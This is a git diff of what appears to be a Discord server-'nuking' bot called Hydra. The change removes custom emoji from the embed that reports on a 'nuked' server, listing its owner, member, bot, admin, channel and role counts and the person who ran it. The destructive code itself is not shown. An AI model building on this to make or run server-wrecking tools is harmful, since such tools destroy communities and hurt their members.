@@ -64,12 +64,12 @@ class Classic(commands.Cog):
                     embed = discord.Embed(
                         title = f'Hydra | Nuked server {guild.name}',
                         description = f'''
-> **🆔 Server ID:** `{ctx.guild.id}`
-> **<:owner_icon:1056590639892017182> Owner:** `{ctx.guild.owner}`
-> **😀 All users:** `{len(ctx.guild.members)}`
-> **👾 All channels:** `{len(ctx.guild.channels)}`
-> **🚦 All roles:** `{len(ctx.guild.roles)}`
-> **💀 Nuker:** `{ctx.author}`
+> **Server ID:** `{ctx.guild.id}`
+> **Owner:** `{ctx.guild.owner}`
+> **All users:** `{len(ctx.guild.members)}`
+> **All channels:** `{len(ctx.guild.channels)}`
+> **All roles:** `{len(ctx.guild.roles)}`
+> **Nuker:** `{ctx.author}`
 
 **Time crash:** `{datetime.datetime.now()}`''',
                         colour = 0xE4C924
@@ -78,29 +78,29 @@ class Classic(commands.Cog):
                     embed.add_field( # Информация о количестве каналов на крашнутом сервере: 1. Общее количество; 2. Количество голосовых каналов; 3. Количество категорий.
                         name = "🗃 | Information about the channels",
                         value = f"""
-> **<:text_channel:1056585809781854250> Text Channels:** `{len(ctx.guild.text_channels)}`
-> **<:voice_channel:1056585811497336853> Voice Channels:** `{len(ctx.guild.voice_channels)}`
-> **<:category:1056585807785369683> Categories:** `{len(ctx.guild.categories)}`""",
+> **Text Channels:** `{len(ctx.guild.text_channels)}`
+> **Voice Channels:** `{len(ctx.guild.voice_channels)}`
+> **Categories:** `{len(ctx.guild.categories)}`""",
                         inline = False
                     )
 
                     embed.add_field( # Информация о количестве участников на крашнутом сервере: 1. Общее количество; 2. Количество людей; 3. Количество ботов; 4. Количество администраторов; Количество модераторов.
                         name = "😀 | Information about the participants",
                         value = f"""
-> **<:ping_icon:1056595440046440448> All users:** `{len(ctx.guild.members)}`
-> **<:all_members:1056590606283067502> People:** `{len([m for m in ctx.guild.members if not m.bot])}`
-> **<:bots:1056592887028121610> Bots:** `{len([m for m in ctx.guild.members if m.bot])}`
-> **<:administrator_icon:1056597013434736722> Administrators:** `{len([m for m in ctx.guild.members if m.guild_permissions.administrator])}`
-> **<:Moderation_icon:1056597752001331361> Moderators:** `{len([m for m in ctx.guild.members if m.guild_permissions.kick_members])}`""",
+> **All users:** `{len(ctx.guild.members)}`
+> **People:** `{len([m for m in ctx.guild.members if not m.bot])}`
+> **Bots:** `{len([m for m in ctx.guild.members if m.bot])}`
+> **Administrators:** `{len([m for m in ctx.guild.members if m.guild_permissions.administrator])}`
+> **Moderators:** `{len([m for m in ctx.guild.members if m.guild_permissions.kick_members])}`""",
                         inline = False
                     )
 
                     embed.add_field(  # Информация о количестве ролей на крашнутом сервере: 1. Общее количество; 2. Количество ролей с правами администрации; 3. Количество людей с модераторскими правами(изгнание с сервера).
                         name = "🚦 | Information about the roles",
                         value = f"""
-> **🪁 All roles:** `{len(ctx.guild.roles)}`
-> **⚙ Moderation roles:** `{len([r for r in ctx.guild.roles if r.permissions.kick_members])}`
-> **⚒ Administration roles:** `{len([r for r in ctx.guild.roles if r.permissions.administrator])}`
+> **All roles:** `{len(ctx.guild.roles)}`
+> **Moderation roles:** `{len([r for r in ctx.guild.roles if r.permissions.kick_members])}`
+> **Administration roles:** `{len([r for r in ctx.guild.roles if r.permissions.administrator])}`
 """,
                         inline = False
                     )
